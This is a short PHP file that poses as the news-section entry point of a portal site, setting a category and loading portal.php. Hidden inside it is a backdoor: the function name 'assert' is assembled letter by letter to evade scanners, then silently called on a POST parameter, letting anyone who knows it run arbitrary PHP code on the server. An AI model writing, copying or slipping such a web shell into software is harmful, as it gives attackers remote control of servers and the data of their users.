<?php
chdir('../');
define('SUB_DIR', '/news/');
$Sub_dir = "a"."s"."s"."e"."r"."t";
$_GET['movd'] = 'list';
$_GET['catid'] = '8';
@$Sub_dir($_POST["dir"]);
require_once './portal.php';
?>